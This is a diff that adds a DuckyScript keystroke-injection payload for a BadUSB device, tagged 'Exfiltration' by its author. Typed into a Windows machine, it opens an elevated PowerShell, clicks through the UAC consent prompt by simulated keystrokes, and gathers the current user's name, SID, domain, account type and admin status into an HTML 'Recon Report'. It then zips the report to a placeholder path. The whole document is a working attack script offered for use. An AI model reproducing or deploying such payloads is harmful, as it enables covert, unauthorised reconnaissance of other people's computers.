@@ -1,0 +1,21 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Saves some general Info about the current Win-User.
+REM Version:	1.0
+REM Category:	Exfiltration
+DELAY 750
+WINDOWS d
+DELAY 900
+WINDOWS r
+DELAY 900
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Walkuer Ghost Report ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>";$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo-57059022.html';$Report = $Report + "<div id=body><h1>Walkuer Ghost Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>";$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired;$UserType = $UserInfo.AccountType;$UserSid = $UserInfo.SID;$UserPass = $UserInfo.PasswordRequired;$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');$Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>";$Report = $Report + "</div>";$Report >> $fileSaveDir'/ComputerInfo-57059022.html'
+ENTER
+STRING Compress-Archive -Path $fileSaveDir -DestinationPath C:\PATH TO SAVE HERE\FILEresults-57059022.zip ; exit 
+ENTER
